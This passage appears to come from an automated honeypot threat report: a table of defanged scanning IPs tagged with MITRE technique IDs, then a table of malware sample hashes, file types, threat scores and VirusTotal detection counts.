| `103.203.57[.]11` | 1 | 2026-10-12 03:56 | 2026-10-12 03:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-10-12 07:55 | 2026-10-12 07:55 | 10s | 0 | `T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-10-12 05:59 | 2026-10-12 05:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-10-12 14:49 | 2026-10-12 14:49 | 10s | 0 | `T1592` | 🟢 LOW |
| `106.12.179[.]53` | 1 | 2026-10-12 14:04 | 2026-10-12 14:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `107.150.101[.]128` | 1 | 2026-10-12 13:53 | 2026-10-12 13:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `108.225.178[.]38` | 1 | 2026-10-12 03:27 | 2026-10-12 03:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]106` | 1 | 2026-10-12 09:12 | 2026-10-12 09:12 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]132` | 1 | 2026-10-12 03:21 | 2026-10-12 03:21 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]172` | 1 | 2026-10-12 08:11 | 2026-10-12 08:11 | 8s | 0 | `T1592` | 🟢 LOW |
| `110.83.220[.]198` | 1 | 2026-10-12 04:23 | 2026-10-12 04:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.254.77[.]18` | 1 | 2026-10-12 16:30 | 2026-10-12 16:31 | 18s | 0 | `T1592` | 🟢 LOW |
| `114.220.176[.]69` | 1 | 2026-10-12 11:09 | 2026-10-12 11:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.67.232[.]93` | 1 | 2026-10-12 14:06 | 2026-10-12 14:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.188[.]197` | 1 | 2026-10-12 03:31 | 2026-10-12 03:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.188[.]201` | 1 | 2026-10-12 14:07 | 2026-10-12 14:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.27[.]238` | 1 | 2026-10-12 15:43 | 2026-10-12 15:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.49.193[.]202` | 1 | 2026-10-12 08:37 | 2026-10-12 08:38 | 19s | 0 | `T1592` | 🟢 LOW |
| `117.50.199[.]249` | 1 | 2026-10-12 18:44 | 2026-10-12 18:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.51[.]198` | 1 | 2026-10-12 18:45 | 2026-10-12 18:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.251.99[.]150` | 1 | 2026-10-12 09:29 | 2026-10-12 09:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.193.183[.]53` | 1 | 2026-10-12 13:46 | 2026-10-12 13:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.27.135[.]110` | 1 | 2026-10-12 10:47 | 2026-10-12 10:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.60[.]44` | 1 | 2026-10-12 14:12 | 2026-10-12 14:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.191.167[.]116` | 1 | 2026-10-12 04:28 | 2026-10-12 04:28 | 17s | 0 | `T1592` | 🟢 LOW |
| `122.155.132[.]40` | 1 | 2026-10-12 14:19 | 2026-10-12 14:20 | 21s | 0 | `T1592` | 🟢 LOW |
| `125.129.1[.]253` | 1 | 2026-10-12 08:01 | 2026-10-12 08:02 | 23s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-12 08:10 | 2026-10-12 08:11 | 46s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-12 17:08 | 2026-10-12 17:09 | 51s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-12 06:06 | 2026-10-12 06:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-12 08:09 | 2026-10-12 08:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-12 10:10 | 2026-10-12 10:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-12 12:10 | 2026-10-12 12:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-12 18:06 | 2026-10-12 18:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]253` | 1 | 2026-10-12 05:41 | 2026-10-12 05:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]140` | 1 | 2026-10-12 05:25 | 2026-10-12 05:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.54.51[.]226` | 1 | 2026-10-12 10:19 | 2026-10-12 10:20 | 27s | 0 | `T1592` | 🟢 LOW |
| `14.55.148[.]34` | 1 | 2026-10-12 03:05 | 2026-10-12 03:05 | 30s | 0 | `T1592` | 🟢 LOW |
| `165.227.62[.]247` | 1 | 2026-10-12 17:29 | 2026-10-12 17:29 | 5s | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | 1 | 2026-10-12 10:40 | 2026-10-12 10:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]202` | 1 | 2026-10-12 14:36 | 2026-10-12 14:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `172.94.9[.]115` | 1 | 2026-10-12 05:12 | 2026-10-12 05:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-10-12 13:35 | 2026-10-12 13:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `175.202.119[.]34` | 1 | 2026-10-12 06:35 | 2026-10-12 06:36 | 22s | 0 | `T1592` | 🟢 LOW |
| `175.202.194[.]168` | 1 | 2026-10-12 04:59 | 2026-10-12 04:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `177.136.245[.]42` | 1 | 2026-10-12 10:49 | 2026-10-12 10:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-12 08:32 | 2026-10-12 08:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `180.76.137[.]24` | 1 | 2026-10-12 17:55 | 2026-10-12 17:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.143[.]203` | 1 | 2026-10-12 16:44 | 2026-10-12 16:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.235[.]157` | 1 | 2026-10-12 10:05 | 2026-10-12 10:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.216[.]153` | 1 | 2026-10-12 05:21 | 2026-10-12 05:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.105.139[.]67` | 1 | 2026-10-12 06:46 | 2026-10-12 06:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.144.55[.]16` | 1 | 2026-10-12 18:43 | 2026-10-12 18:43 | 26s | 0 | `T1592` | 🟢 LOW |
| `185.9.139[.]102` | 1 | 2026-10-12 06:18 | 2026-10-12 06:18 | 25s | 0 | `T1592` | 🟢 LOW |
| `186.15.96[.]126` | 1 | 2026-10-12 14:25 | 2026-10-12 14:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `188.227.111[.]138` | 1 | 2026-10-12 10:50 | 2026-10-12 10:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-12 10:47 | 2026-10-12 10:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-12 13:13 | 2026-10-12 13:13 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.176.29[.]24` | 1 | 2026-10-12 10:30 | 2026-10-12 10:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]210` | 1 | 2026-10-12 16:13 | 2026-10-12 16:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]226` | 1 | 2026-10-12 12:36 | 2026-10-12 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.8.186[.]31` | 1 | 2026-10-12 14:21 | 2026-10-12 14:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.50.235[.]148` | 1 | 2026-10-12 16:14 | 2026-10-12 16:14 | 10s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-10-12 09:13 | 2026-10-12 09:13 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]150` | 1 | 2026-10-12 18:27 | 2026-10-12 18:27 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.14.76[.]35` | 1 | 2026-10-12 17:45 | 2026-10-12 17:45 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.221.74[.]129` | 1 | 2026-10-12 18:06 | 2026-10-12 18:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.64.98[.]9` | 1 | 2026-10-12 06:50 | 2026-10-12 06:50 | 9s | 0 | `T1592` | 🟢 LOW |
| `211.231.63[.]187` | 1 | 2026-10-12 12:44 | 2026-10-12 12:44 | 26s | 0 | `T1592` | 🟢 LOW |
| `211.47.82[.]173` | 1 | 2026-10-12 14:16 | 2026-10-12 14:17 | 14s | 0 | `T1592` | 🟢 LOW |
| `211.63.225[.]145` | 1 | 2026-10-12 05:05 | 2026-10-12 05:05 | 15s | 0 | `T1592` | 🟢 LOW |
| `216.244.224[.]226` | 1 | 2026-10-12 12:37 | 2026-10-12 12:37 | 11s | 0 | `T1592` | 🟢 LOW |
| `217.196.163[.]136` | 1 | 2026-10-12 02:58 | 2026-10-12 02:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.78.141[.]57` | 1 | 2026-10-12 07:38 | 2026-10-12 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.154.133[.]166` | 1 | 2026-10-12 09:42 | 2026-10-12 09:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.93.200[.]5` | 1 | 2026-10-12 15:54 | 2026-10-12 15:54 | 24s | 0 | `T1592` | 🟢 LOW |
| `221.144.221[.]177` | 1 | 2026-10-12 05:44 | 2026-10-12 05:44 | 22s | 0 | `T1592` | 🟢 LOW |
| `221.144.221[.]177` | 1 | 2026-10-12 13:18 | 2026-10-12 13:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.149.43[.]154` | 1 | 2026-10-12 10:22 | 2026-10-12 10:22 | 15s | 0 | `T1592` | 🟢 LOW |
| `222.104.99[.]233` | 1 | 2026-10-12 08:04 | 2026-10-12 08:04 | 29s | 0 | `T1592` | 🟢 LOW |
| `222.113.192[.]184` | 1 | 2026-10-12 11:43 | 2026-10-12 11:43 | 20s | 0 | `T1592` | 🟢 LOW |
| `222.113.196[.]55` | 1 | 2026-10-12 02:56 | 2026-10-12 02:56 | 20s | 0 | `T1592` | 🟢 LOW |
| `222.113.207[.]183` | 1 | 2026-10-12 12:34 | 2026-10-12 12:34 | 18s | 0 | `T1592` | 🟢 LOW |
| `222.128.171[.]66` | 1 | 2026-10-12 04:21 | 2026-10-12 04:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `24.72.29[.]49` | 1 | 2026-10-12 14:15 | 2026-10-12 14:15 | 29s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-12 16:56 | 2026-10-12 16:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.140.11[.]243` | 1 | 2026-10-12 03:34 | 2026-10-12 03:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `34.156.111[.]167` | 1 | 2026-10-12 03:52 | 2026-10-12 03:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.53.129[.]203` | 1 | 2026-10-12 04:10 | 2026-10-12 04:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `34.53.138[.]9` | 1 | 2026-10-12 03:52 | 2026-10-12 03:52 | 6s | 0 | `T1592` | 🟢 LOW |
| `34.78.224[.]135` | 1 | 2026-10-12 03:06 | 2026-10-12 03:06 | 2s | 0 | `T1592` | 🟢 LOW |
| `36.34.82[.]54` | 1 | 2026-10-12 08:47 | 2026-10-12 08:48 | 26s | 0 | `T1592` | 🟢 LOW |
| `37.77.109[.]155` | 1 | 2026-10-12 13:14 | 2026-10-12 13:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.51.48[.]4` | 1 | 2026-10-12 10:05 | 2026-10-12 10:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `4.148.17[.]156` | 1 | 2026-10-12 10:46 | 2026-10-12 10:46 | 9s | 0 | `T1592` | 🟢 LOW |
| `40.124.178[.]159` | 1 | 2026-10-12 05:34 | 2026-10-12 05:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.226.40[.]202` | 1 | 2026-10-12 15:51 | 2026-10-12 15:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-12 13:06 | 2026-10-12 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]240` | 1 | 2026-10-12 13:35 | 2026-10-12 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-12 12:27 | 2026-10-12 12:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-12 17:22 | 2026-10-12 17:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.172.210[.]198` | 1 | 2026-10-12 09:50 | 2026-10-12 09:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.184.48[.]247` | 1 | 2026-10-12 07:46 | 2026-10-12 07:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.184.48[.]247` | 1 | 2026-10-12 13:12 | 2026-10-12 13:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-10-12 11:35 | 2026-10-12 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-10-12 15:35 | 2026-10-12 15:35 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-10-12 14:35 | 2026-10-12 14:35 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-10-12 14:35 | 2026-10-12 14:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-10-12 10:36 | 2026-10-12 10:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-10-12 13:35 | 2026-10-12 13:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.82.78[.]104` | 1 | 2026-10-12 07:33 | 2026-10-12 07:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.236.192[.]26` | 1 | 2026-10-12 17:48 | 2026-10-12 17:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.72.212[.]22` | 1 | 2026-10-12 14:04 | 2026-10-12 14:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `50.33.111[.]247` | 1 | 2026-10-12 05:33 | 2026-10-12 05:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-12 07:11 | 2026-10-12 07:11 | 1s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-12 10:27 | 2026-10-12 10:27 | 6s | 0 | `T1592` | 🟢 LOW |
| `58.177.78[.]181` | 1 | 2026-10-12 16:15 | 2026-10-12 16:16 | 30s | 0 | `T1592` | 🟢 LOW |
| `59.23.126[.]178` | 1 | 2026-10-12 14:15 | 2026-10-12 14:15 | 26s | 0 | `T1592` | 🟢 LOW |
| `59.29.136[.]96` | 1 | 2026-10-12 13:47 | 2026-10-12 13:47 | 20s | 0 | `T1592` | 🟢 LOW |
| `59.29.136[.]96` | 1 | 2026-10-12 17:03 | 2026-10-12 17:03 | 22s | 0 | `T1592` | 🟢 LOW |
| `62.108.201[.]221` | 1 | 2026-10-12 04:40 | 2026-10-12 04:41 | 26s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-10-12 04:06 | 2026-10-12 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-10-12 07:04 | 2026-10-12 07:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-10-12 16:04 | 2026-10-12 16:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | 1 | 2026-10-12 04:18 | 2026-10-12 04:18 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]32` | 1 | 2026-10-12 05:52 | 2026-10-12 05:52 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]222` | 1 | 2026-10-12 04:10 | 2026-10-12 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]206` | 1 | 2026-10-12 16:32 | 2026-10-12 16:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]43` | 1 | 2026-10-12 14:43 | 2026-10-12 14:43 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]166` | 1 | 2026-10-12 14:41 | 2026-10-12 14:41 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]64` | 1 | 2026-10-12 04:30 | 2026-10-12 04:30 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]96` | 1 | 2026-10-12 14:43 | 2026-10-12 14:43 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]162` | 1 | 2026-10-12 14:27 | 2026-10-12 14:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]208` | 1 | 2026-10-12 08:44 | 2026-10-12 08:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]214` | 1 | 2026-10-12 04:29 | 2026-10-12 04:29 | 10s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]240` | 1 | 2026-10-12 14:40 | 2026-10-12 14:40 | 10s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-10-12 18:48 | 2026-10-12 18:48 | 2s | 0 | `T1592` | 🟢 LOW |
| `71.6.167[.]142` | 1 | 2026-10-12 06:17 | 2026-10-12 06:17 | 1s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]27` | 1 | 2026-10-12 07:54 | 2026-10-12 07:54 | 8s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]27` | 1 | 2026-10-12 15:43 | 2026-10-12 15:43 | 7s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-10-12 12:35 | 2026-10-12 12:35 | 4s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-12 04:18 | 2026-10-12 04:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-12 07:48 | 2026-10-12 07:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-12 17:19 | 2026-10-12 17:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]148` | 1 | 2026-10-12 18:05 | 2026-10-12 18:05 | 8s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-10-12 12:47 | 2026-10-12 12:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.71.42[.]188` | 1 | 2026-10-12 16:32 | 2026-10-12 16:33 | 17s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-10-12 03:21 | 2026-10-12 03:21 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-10-12 06:00 | 2026-10-12 06:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]140` | 1 | 2026-10-12 10:17 | 2026-10-12 10:17 | 1s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]87` | 1 | 2026-10-12 10:29 | 2026-10-12 10:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.219[.]244` | 1 | 2026-10-12 12:37 | 2026-10-12 12:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.70[.]115` | 1 | 2026-10-12 08:22 | 2026-10-12 08:23 | 12s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]29` | 1 | 2026-10-12 18:53 | 2026-10-12 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]6` | 1 | 2026-10-12 18:53 | 2026-10-12 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]34` | 1 | 2026-10-12 11:13 | 2026-10-12 11:13 | 2s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]12` | 1 | 2026-10-12 09:52 | 2026-10-12 09:52 | 31s | 0 | `T1592` | 🟢 LOW |
| `90.193.93[.]11` | 1 | 2026-10-12 18:03 | 2026-10-12 18:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `93.92.193[.]45` | 1 | 2026-10-12 07:47 | 2026-10-12 07:47 | 2s | 0 | `T1592` | 🟢 LOW |
| `94.231.132[.]82` | 1 | 2026-10-12 04:41 | 2026-10-12 04:41 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
